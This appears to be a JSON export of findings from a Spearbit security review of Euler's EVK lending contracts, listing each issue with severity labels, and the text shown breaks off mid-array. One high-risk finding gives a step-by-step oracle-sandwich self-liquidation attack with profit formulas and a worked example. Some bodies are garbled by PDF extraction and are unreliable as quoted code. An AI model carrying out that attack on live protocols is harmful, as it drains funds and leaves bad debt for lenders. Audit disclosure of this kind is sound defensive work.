[
    {
        "title": "PegStabilityModule assumes underlying has 18 decimals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The swap amounts in the PegStabilityModule are quoted in the same decimals as the synth, which If the pegged underlying has is always 18. different decimals, it's profitable to perform the swap. It is therefore only compatible with underlying's of 18 decimals.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Self-liquidations of leveraged positions can be profitable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "An attacker can perform the following attack by sandwiching a price oracle update: 1. Taking on a leveraged position by flashloaning collateral and max-borrowing the debt token. 2. Performing the price update. 3. Liquidating themself (from another subaccount). Profitability: The attack is profitable when the entire collateral balance cl is seized (to repay the flashloan) while repaying fewer debt assets than assets that were borrowed. This difference of maxBorrowAssets - maxRepayAs- sets of debt assets is the profit. # discount factor: df = 1 - discount # collateralPrice_0 = price before the oracle update # collateralPrice_1 = price after the oracle update collateralPrice_1 = collateralPrice_0 * (1 - priceDrop) # the maximum debt asset we can borrow is maxBorrowAssets = LTV_borrow * collateralBalance * collateralPrice_0 / debtPrice # from the liquidation code we see that seizedAssets = repayValue / discountFactor / collateralPrice_1 = (repayAssets * debtPrice) / discountFactor / collateralPrice_1 # expressed in terms of repayAssets that seize the maximum (entire) collateral balance maxRepayAssets = collateralBalance * discountFactor * collateralPrice_1 / debtPrice # profitable if this inequality holds maxBorrowAssets > maxRepayAssets LTV_borrow * collateralBalance * collateralPrice_0 / debtPrice > collateralBalance * discountFactor * collateralPrice_1 / debtPrice <=> LTV_borrow > discountFactor * (1 - priceDrop) 6 The discountFactor is set to max(hs_liquidation, 0.8). The attack is profitable if an attacker can sandwich a price oracle update that would end up with LTV_borrow > discountFactor * (1 - priceDrop). Some oracle adapters, like Redstone and Pyth, allow the users to update or even choose a preferable price. In this case, the attack could even be performed in a single transaction batch for risk-free profit. Note: Using several smaller liquidations can increase the overall liquidation discount and lead to a more profitable attack. A profitable attack also leaves bad debt for the protocol. See this Notebook for further profitability analysis. Example: LTV_borrow = LTV_liquidation = 90%. Oracle quotes 1 collateral at $1 (and debt is fixed at $1). Sandwich collateral oracle price update to $0.90: 1. Flashloan 1000 collateral and build a position of (1000 collateral, 900 debt) at LTV_borrow. 2. Oracle sets collateral price to $0.90. (for example, Redstone / Pyth require the user to trigger the update.) 3. Liquidate self by repaying maxRepayAssets = 810. discountFactor = healthscore_liquidation = collateralBalance * collateralPrice_1 * LTV_liquidation / ,! debtValue = 0.90 maxBorrowAssets: 900 maxRepayAssets: 810 seizedAssets: maxRepayAssets * debtPrice / discountFactor / collateralPrice_1 = 810D * 1$/D / 0.9 / ,! Profit: maxBorrowAssets - maxRepayAssets = 900 - 810 = 90 0.9$/C = 1000C The current maximum discount is set to 20% which can lead to profitable attacks for high LTV collateral assets even for small price drops. The remaining debt will be bad debt for the protocol and might be socialized across all lenders.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Interest accumulated, but not accounted yet, could be reset if Governance updates the interest rate model when in \"Interest Overflows\" state",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "Let's assume that borrowers have borrowed an amount X for which when Cache.loadVault() is executed, the interest accrued added to X would make the newTotalBorrows value overflow the MAX_SANE_DEBT_- AMOUNT. When such a scenario happens, the totalBorrows, interestAccumulator and lastInterestAccumulatorUpdate are not updated (same for accumulatedFees and totalShares). In practice, the interest accrued is \"paused\" and won't be accrued and grow until enough will be paid to allow the next calculation of newTotalBorrows to not overflow anymore. If during this scenario, the Governance updated the interest rate model to an empty one or a reverting one, all the accumulated interest will be reset and lost forever. function setInterestRateModel(address newModel) public virtual nonReentrant governorOnly { VaultCache memory vaultCache = updateVault(); vaultStorage.interestRateModel = newModel; vaultStorage.interestRate = 0; uint256 newInterestRate = computeInterestRate(vaultCache); logVaultStatus(vaultCache, newInterestRate); emit GovSetInterestRateModel(newModel); } 1) updateVault() won't update the vault storage/cache because of the overflow. 2) vaultStorage.interestRate = 0 update the interest rate to zero, meaning that no interest will be accrued anymore. 3) computeInterestRate(vaultCache); when the model reverts or is address(0) do not update interestRate leaving it to the previous value that in this case is 0 (update in the instruction above). At this point, the next time updateVault() will be called it will not overflow anymore because the interestRate is zero and newInterestAccumulator is equal to vaultCache.interestAccumulator that has not been updated since the beginning of the overflow phase. totalBorrows and interestAccumulator will be updated with the current values (no changes) and lastInter- estAccumulatorUpdate will be updated to block.timestamp, resulting in a loss of the total interest accrued but never accounted until now (since the start of the interest overflow period).",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Governance.setInterestRateModel is missing sanity checks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The Governance.setInterestRateModel is not actively checking the user newModel input that rep- resents the new IRM rate model. When a new IRM is provided, the interest rate is resetted to 0 and then updated via computeInterestRate(vaultCache). The transaction should revert when:  newModel is equal to the current model.  newModel is a broken IRM model that will revert when computeInterestRate is executed. The second case should be correctly handled, given that it violates a white paper invariant defined in the Interest Rate section: When a vault has address(0) installed as an IRM, an interest rate of 0% is assumed. vault's IRM fails, the vault will ignore this failure and continue with the previous interest rate. If a call to the Because the interest rate has been already reset to 0, when the new interest rate is called and reverts, it won't update the value to the old one but will remain equal to 0. In general, this case should be handled because the governance should not be able to actively set the IRM to a faulty one. Allowing such case will mean that borrowers won't accrue any interest on their open position and lenders will not accrue any rewards. To be able to handle this case, the computeInterestRate must be refactored to return if the IRM call has reverted.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "EulerSavingsRate maxWithdraw and maxRedeem are not returning the correct underestimated value when owner has a controller enabled",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The EulerSavingsRate is an ERC4626 vault that integrates with the EVC ecosystem, allowing the module to be used as collateral for EVK vaults. Because ESR shares can be used as collaterals, it's important that operations like transfer, transferFrom, withdraw and redeem ensure that users who have enabled a controller are still healthy after the execution of such operation. For this reason, any of the above functions executes the EVCUtil.requireAccountStatusCheck. Because of this integration with EVC and EVK, the EulerSavingsRate module must implement the same logic implemented by Vault when the ERC4626 functions maxRedeem and maxWithdraw are called. The value returned by such functions should be underestimated to zero if the owner parameter has enabled a controller (the user could be unhealthy and the transaction could revert).",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "IRMSynth's targetQuote assumes reference asset has 18 decimals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The IRMSynth.targetQuote parameter is set to 1e18. It is compared against the output of ora- cle.getQuote(1e18, synth, referenceAsset) that returns a reference asset amount which will be in reference asset decimals.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "maxMint/maxDeposit can overestimate shares/assets as it ignores totalShares overflow",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The maxMint function currently returns shares < MAX_SANE_AMOUNT ? shares : MAX_SANE_AMOUNT where shares are the max-deposit assets converted to shares. However, it needs to take the current totalSupply into account as totalSupply + shares <= MAX_SANE_AMOUNT should hold. It can return a larger amount than what can actually be accepted, according to EIP4626, this breaks the behavior: MUST return the maximum amount of shares mint would allow to be deposited to receiver and not cause a revert, which MUST NOT be higher than the actual maximum that would be accepted (it should underestimate if necessary). Note that maxDepositInternal only looks at cash and if the vault has a high utilization, maxDeposit- Internal might return a large value, indeed resulting in a large shares amount that would overflow the totalSupply's MAX_SANE_AMOUNT.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Vault.maxRedeemInternal should always underestimate when user has a controller enabled",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "In the current implementation of Vault.maxRedeemInternal, the function underestimates the amount that the user can redeem/withdraw to zero if the owner has enabled the asset as collateral and has a controller enabled. A more correct underestimation would be return Shares.wrap(0) when a controller has been enabled without checking if the asset has been enabled as collateral. The current implementation of the checkAccountStatus of a Controller Vault inside the RiskManager contract will revert if the user is unhealthy, no matter what the operation was or if it involved the transfer or withdraw/redeem of a non-collateral (for the user) asset.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "initVaultCache can revert breaking liveness assumptions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "While some parts of the initVaultCache gracefully handle overflows, other parts can still revert: // multiplication can overflow uint256 newTotalBorrows = ,! vaultCache.interestAccumulator; vaultCache.totalBorrows.toUint() * newInterestAccumulator / // if newTotalBorrows didn ,! uint256 feeAssets = (newTotalBorrows - vaultCache.totalBorrows.toUint()) * interestFee.toUint16() interestAccumulator > interestFee. (unless we use FullMath to compute newTotalBorrows) t overflow either because it was divided by t overflow, this shouldn   / (1e4 << INTERNAL_DEBT_PRECISION_SHIFT); The guarantee described in the Whitepaper is broken: In the event that a vault encounters an overflow (either in rpow or its accumulator) the accumulator will stop growing, meaning that no further interest will be earned/charged. However, debts can still be repaid and funds withdrawn.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Setting LTV configs without a configured oracle makes EVK unusable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The setLTV function is used to set a new LTV config for a new or an existing collateral address. However, it isn't checked whether the added collateral has a configured oracle. If collaterals are added without a configured oracle, most of the EVK functionality will be bricked. The setLTV function: 14 /// @inheritdoc IGovernance function setLTV(address collateral, uint16 ltv, uint32 rampDuration) public virtual nonReentrant ,! governorOnly { // self-collateralization is not allowed if (collateral == address(this)) revert E_InvalidLTVAsset(); ConfigAmount newLTVAmount = ltv.toConfigAmount(); LTVConfig memory origLTV = vaultStorage.ltvLookup[collateral]; // If new LTV is higher than the previous, or the same, it should take effect immediately if (newLTVAmount >= origLTV.getLTV(true) && rampDuration > 0) revert E_LTVRamp(); LTVConfig memory newLTV = origLTV.setLTV(newLTVAmount, rampDuration); vaultStorage.ltvLookup[collateral] = newLTV; if (!origLTV.initialized) vaultStorage.ltvList.push(collateral); emit GovSetLTV( collateral, newLTV.targetTimestamp, newLTV.targetLTV.toUint16(), newLTV.rampDuration, newLTV.originalLTV.toUint16() ); }",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Suppliers will be able to mint new shares even if vaultCache.totalShares is virtually above the MAX_SANE_AMOUNT",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "Like for the totalBorrows, the Cache.initVaultCache could also overflow for the totalShares. This scenario happens when part of the accrued interest must be accounted to the protocol/vault owner as fees (in shares). This is the logic that calculates the new total shares amount given feeAssets > 0: if (feeAssets != 0) { uint256 newTotalAssets = vaultCache.cash.toUint() + OwedLib.toAssetsUpUint256(newTotalBorrows); newTotalShares = newTotalAssets * newTotalShares / (newTotalAssets - feeAssets); newAccumulatedFees += newTotalShares - vaultCache.totalShares.toUint(); } The newTotalShares re-calculated to account for the fees could be virtually above the upper limit of MAX_- SANE_AMOUNT. If we are in such a scenario, the function won't update vaultCache.accumulatedFees and vault- Cache.totalShares: 15 if (newTotalShares != vaultCache.totalShares.toUint() && newTotalShares <= MAX_SANE_AMOUNT) { vaultCache.accumulatedFees = newAccumulatedFees.toShares(); vaultCache.totalShares = newTotalShares.toShares(); } As a consequence, all the accrued interest, until the new share amount is not overflowing anymore, will be ac- counted to the in total to the suppliers and not to the protocol/vault owner. Unlike the overflowing of the totalBor- rows the not accounted accumulatedFees are lost forever for the protocol. The second side effect of not accounting the shares to be minted to the protocol/vault owner is that users will be anyway able to mint new shares up to the delta MAX_SANE_AMOUNT - vaultCache.totalShares even if virtually, the real value of vaultCache.totalShares would be already above MAX_SANE_AMOUNT.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Token transfer methods should not allow from == address(0) and to == address(0)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The functions transfer, transferFrom and transferFromMax allow the caller to specify arbitrary from and to. Both the input parameters are allowed to assume the address(0) value. Both transfer and transferFromMax internally will execute transferFrom with some custom logic depending on which function is executed. /// @inheritdoc IERC20 function transfer(address to, uint256 amount) public virtual reentrantOK returns (bool) { return transferFrom(address(0), to, amount); } /// @inheritdoc IToken function transferFromMax(address from, address to) public virtual reentrantOK returns (bool) { return transferFrom(from, to, vaultStorage.users[from].getBalance().toUint()); } /// @inheritdoc IERC20 function transferFrom(address from, address to, uint256 amount) public virtual nonReentrant returns ,! (bool) { (, address account) = initOperation(OP_TRANSFER, from == address(0) ? CHECKACCOUNT_CALLER : from); if (from == address(0)) from = account; if (from == to) revert E_SelfTransfer(); Shares shares = amount.toShares(); decreaseAllowance(from, account, shares); transferBalance(from, to, shares); return true; } 16 Allowing to transfer shares to the address(0) (to = address(0)) should not be permitted, given that the same behavior in BalanceUtils.increaseBalance will result in a revert. Allowing to execute transferFromMax with from = address(0) (with the ability to perform the transfer to address(0)) will instead enable a funky behavior. In this case, the balance of address(0)will be used as theamountbuttransferFromwill use themsg.sender as the caller. Let's see an example: 1) Alice owns 3e18 shares. 2) Alice calls transfer(address(0), 1e18) sending 1e18 shares to address(0). 3) Alice calls transferFromMax(address(0), bob), she wants to transfer her whole balance of 2e18 shares to Bob. When transferFromMax is executed, Alice owns 2e18 shares, but the function will use the balance of address(0) Inside as the source of the amount to be transferred (vaultStorage.users[from].getBalance().toUint()). transferFrom, the from value will be changed from address(0) to Alice and will transfer 1e18 (the shares ac- counted in the balance of address(0)) from Alice to Bob. The result is that Alice has not transferred her whole balance of 2e18 to Bob but just 1e18.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Borrowers could be able to borrow avoiding the borrowCap",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "Let's assume that the borrowCap has been configured with a value near MAX_SANE_DEBT_AMOUNT and that we are in a situation where Cache.initVaultCache has overflown when the snapshot has been taken. Cache.initVaultCache overflows when totalBorrows + the accrued interest would be bigger than MAX_SANE_- DEBT_AMOUNT. In this case, both totalBorrows and interestAccumulator are not updated in the vault cache and storage. Let's also assume that when the snapshot was taken totalBorrows (that because of the overflow does not include the accrued interest) is below vaultCache.borrowCap even if in theory it would be virtually already above such cap. Given these premises, a borrower could be able to perform a borrowing operation avoiding the borrow caps if the amount borrowed is lower than totalBorrows - MAX_SANE_DEBT_AMOUNT. When if (borrows > vaultCache.borrowCap && borrows > prevBorrows) revert E_BorrowCapEx- ceeded(); is evaluated, snapshot.borrows has been initialized with the cached version of the totalBorrows that was not including the accrued interest. 17",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Borrowers will be able to borrow even if the totalBorrows is virtually already above the MAX_SANE_- DEBT_AMOUNT",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "Let's assume that there's no borrow cap configured or that the borrow cap is very near the MAX_- SANE_DEBT_AMOUNT. Let's also assume that the current totalBorrows + accrued interest overflows the MAX_SANE_- DEBT_AMOUNT value. In this scenario, the Cache.initVaultCache will not accrue the interest into totalBorrows to avoid overflowing and the totalBorrows and interestAccumulator value will remain unchanged in both the vault cache and storage. In this case, a borrower could be able to perform a borrow operation if the amount borrowed is less than the delta MAX_SANE_DEBT_AMOUNT - totalBorrows. This behavior should be forbidden given that:  The totalBorrows is virtually already over the MAX_SANE_DEBT_AMOUNT is we consider the accrued interest.  The borrower was able to open a borrowing position with a favorable non-updated interestAccumulator.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "setHookConfig and setConfigFlags should validate the new flags value",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "Both Governance.setHookConfig and Governance.setConfigFlags functions allow the caller to set an arbitrary value of the flags without performing any sanity checks. This means that the user could enable flags that are not currently supported by the current implementation of the vault. If future implementation of the EVK will use those flags, the vault instance could act in an unexpected way (reverts, can't withdraw, redeem, borrow or in general is disrupted). The scenario would be even more problematic if the vault has also renounced to the ownership and the flags cannot be changed anymore.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Governance should not be able to change the vault's name and symbol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The current implementation of the Governance contract allows the governor to update at any point and with any value, even an empty one, both the name and symbol of the deployed EVault. These values are later on used in Token.name and Token.symbol. Allowing such behavior could create confusion and could be leveraged by malicious users to pursue attack vectors like scams or code injections.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Consider reverting the flashloan operation if the returned amount of is not exactly the original balance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The current flashloan logic will revert if the new EVault balance is lower compared to the one snapshotted before the flashloan. if (asset.balanceOf(address(this)) < origBalance) revert E_FlashLoanNotRepaid(); With such logic, the flashloan function allows, without any valid reason, the caller to transfer more asset than required. In such a scenario, the user will be forced to include in the batch a skim execution, otherwise, the surplus \"donated\" to the vault will be lost (skimmed by someone else in the future).",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "CFG_EVC_COMPATIBLE_ASSET should be immutable and not be allowed to be changed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The role of the governance config flag CFG_EVC_COMPATIBLE_ASSET is to ensure that the underlying vault asset is not transferred to a subaccount (in the EVC context) if such asset is not EVC compatible. The name of the flag, its meaning, and its role are self-explanatory and very explicit. Such a flag should be set to true when the underlying asset of the EVault is an EVC-compatible asset, and to false if otherwise it's a \"normal\" ERC20-like token. Currently, the Governance module allows the owner to change the value of such flag at any moment and to a value that could be wrong given the EVault configuration given that there is no validation between the flag's value and the underlying vault's asset. Given such premises, we suggest to:  Set the CFG_EVC_COMPATIBLE_ASSET flag as an immutable value.  Initialize the CFG_EVC_COMPATIBLE_ASSET flag when the EVault is initialized.  Initialize the flag to true if the asset exposes the EVC() getter and if the address returned by such getter is equal to the evc address used for the EVault just deployed.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Virtual shares steal interest",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "When redeeming (or withdrawing) vault shares, the conversion uses the total shares including the virtual shares to compute the principal and interest earned: 20   redeem // in // shares * (totalAssets + 1e6) / (totalShares + 1e6) Assets assets = shares.toAssetsDown(vaultCache); function toAssetsDown(Shares amount, VaultCache memory vaultCache) internal pure returns (Assets) { (uint256 totalAssets, uint256 totalShares) = ConversionHelpers.conversionTotals(vaultCache); unchecked { return TypesLib.toAssets(amount.toUint() * totalAssets / totalShares); } } library ConversionHelpers { ,! // virtual deposit used in conversions between shares and assets, serving as exchange rate manipulation mitigation uint256 constant VIRTUAL_DEPOSIT_AMOUNT = 1e6; function conversionTotals(VaultCache memory vaultCache) internal pure returns (uint256 totalAssets, uint256 totalShares) { unchecked { totalAssets = vaultCache.cash.toUint() + vaultCache.totalBorrows.toAssetsUp().toUint() + ,! VIRTUAL_DEPOSIT_AMOUNT; totalShares = vaultCache.totalShares.toUint() + VIRTUAL_DEPOSIT_AMOUNT; } } } Therefore, the virtual shares have their own fair share on the total assets (including virtual assets), essentially earning interest and locking it up. This interest cannot be withdrawn as the virtual shares are not owned by anyone.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Immutable EVK vault creation via GenericFactory could be frontrunned by an update of the imple- mentation, different from the one chosen by the caller",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "GenericFactory.createProxy is the function that anyone should use to deploy a valid and recog- nized EVK compatible vault. The function allows the caller to specify an upgradeable parameter that when it's false will deploy an immutable vault using the current value of the state variable implementation. This state variable can be changed at any time by the GenericFactory admin via the setImplementation function. The EVK white paper states that: After creating an immutable vault, the vault's implementation should be confirmed to be the desired version, since it could've been changed by the factory admin prior to vault creation. It's important to allow the vault creator to ensure that the vault will be created with the desired and expected implementation without the risk of being frontrunned on purpose or mistakenly. 21",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "IRMSynth should revert when deployed with a non-compatible oracle",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "Unlike the IRMLinearKink which does not have any external dependencies, the IRMSynth IRM has 3 different dependencies. Given that the oracle is the main dependency, the deployment of the IRM should revert if the very first call reverts or returns an invalid value. This means that the oracle has one of the following problems:  It's not an Euler oracle.  It has not been correctly configured to support synth and referenceAsset.  It's not working as expected, given that the returned price is 0.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "ESynth should only allow the execution of allocate and deallocate to and from EVC-compatible vault",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The allocate and deallocate functions allow the ESynth contract to deposit and withdraw ESynth tokens from EVC compatible vaults specified by the caller in the function input parameter. The specified vault should follow these requirements:  It's an EVC-compatible vault.  Use the same EVC address used by the ESynth. Both these requirements are not checked when those functions are executed. Furthermore, when an allocate is performed, the vault is added to the ignore total supply. happening for the full allocated amount, the vault is not deleted from the ignored total supply. If the deallocation is",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "IRMSynth special-cases oracle price of 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The IRMSynth._computeRate code treats a quoted amount of 0 as an error condition. However, the Euler oracles revert on error conditions and don't use a return value of 0 to indicate errors.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Non-standard ERC20 behavior for EVault with from=address(0)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The Token module that is used for the eVault ERC20 shares handles a transferFrom (and trans- ferFromMax) with from=address(0) as a transfer from the EVC-authenticated account (usually msg.sender). When integrating eVault ERC20 tokens this special behavior is unexpected and could lead to incompatibilities. Note that this is still an issue even if the integrator does not use the EVC as the entrypoint and just treats the vault as a standard ERC20 token.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Fee shares are minted at worse price for fee receivers",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "Whenever interest is accrued, part of the interest is taken as a fee. This fee is used to mint shares for the \"fee receivers\". The code should work like adding (newInterest - feeAssets) to totalAssets, then depositing feeAssets into the vault to mint new shares for them. However, it is currently ignoring the VIR- TUAL_DEPOSIT_AMOUNT = 1e6 of the deposit step conversion. This leads to the fee receivers receiving fewer shares in practice, compared to them receiving the fee as \"assets\" and depositing themselves. (As they mint at a higher share price totalAssets / totalShares > (totalAssets + VIRTUAL_DEPOSIT_AMOUNT) / (total- Shares + VIRTUAL_DEPOSIT_AMOUNT) for most vaults.) the virtual amounts are",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "ESynth.mint can emit 0-Transfer events for non-allowed minters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The mint function can currently be called by anyone, even if they're not an authorized minter. Autho- rized minters are the ones for whom the admin has set capacity. In order to avoid this, it should revert if amount == 0, what would prevent the executions and emitting Trans- fer(address(0), account, 0) event when _mint(...) is called. Mint checks involving capacity should add logic in order to handle cases where capacity == 0 && amount == 0, as it will return false allowing the execution of mint function. Same allowed behavior happens on burn function when using amount == 0 even if you shouldn't be able to effec- tively burn from an account.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "evc used by the PegStabilityModule and ESynth contract may not be the same",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "PegStabilityModule constructor stores an ESynth address which is not enforced to be related to the corresponding EVC used. Add a sanity check that enforces that PegStabilityModule EVC is the same one used by the ESynth contract. To be able to do that, the evc variable inside EVCUtil should be exposed. Now it's an internal one without any getter.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "PegStabilityModule should change sanity checks from > to >=",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "toUnderlyingFeeBPS and toSynthFeeBPS must be < BPS_SCALE otherwise quoteToUnderlying- GivenOut and quoteToSynthGivenOut will revert because of division by zero. Also, when they are equal ESynth/underlying for underlying/ESynth. to BPS_SCALE the user would get nothing back when they swap amountIn of",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "PegStabilityModule quoteToSynthGivenOut should round in favor of the protocol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The value returned by quoteToSynthGivenOut: function quoteToSynthGivenOut(uint256 amountOut) public view returns (uint256) { return amountOut * BPS_SCALE / (BPS_SCALE - TO_SYNTH_FEE); } Will be used to quote how many underlying tokens the user must pay to get back amountOut of ESynth tokens when called at swapToSynthGivenOut: function swapToSynthGivenOut(uint256 amountOut, address receiver) external returns (uint256) { uint256 amountIn = quoteToSynthGivenOut(amountOut); underlying.safeTransferFrom(_msgSender(), address(this), amountIn); synth.mint(receiver, amountOut); return amountIn; }",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "PegStabilityModule quoteToUnderlyingGivenOut should round in favor of the protocol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The value returned by quoteToUnderlyingGivenOut: function quoteToUnderlyingGivenOut(uint256 amountOut) public view returns (uint256) { return amountOut * BPS_SCALE / (BPS_SCALE - TO_UNDERLYING_FEE); } Will be used to determine the amount of Esynth assets that the user needs to pay to get back amountOut of underlying assets when calling swapToUnderlyingGivenOut: function swapToUnderlyingGivenOut(uint256 amountOut, address receiver) external returns (uint256) { uint256 amountIn = quoteToUnderlyingGivenOut(amountOut); synth.burn(_msgSender(), amountIn); underlying.safeTransfer(receiver, amountOut); return amountIn; } This value should favor the protocol and not the user.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Single-step admin transfer can be risky",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "GenericFactory.sol implements the role of upgradeAdmin which performs the action of setting new implementations or setting a new upgradeAdmin. It uses a single-step role transfer design, which adds the risk of setting an unwanted role owner by accident. If the ownership transfer is not done with excessive care it can be lost forever. Similarly, it happens with the Open Zeppelin Ownable library at ESynth contract, which could be Ownable2Step to avoid possible problems.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "delegateToModuleView's caller encoding can be packed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The delegateToModuleView function appends the caller address for other view functions that are delegatecall'd into. It's currently appended as a 32-bytes value (with the upper 12 bytes being zero). It can be read using ProxyUtils.useViewCaller().",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Avoid using +=, -= operators for storage variables",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "+= and -= operations on storage variables are cheaper if declared as totalAssetsDeposited = totalAssetsDeposited + assets. Gas optimization from this is ~15-30 gas per call/instance. Over 948 in the tests after the 3 instances change.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Gas Optimization"
        ]
    },
    {
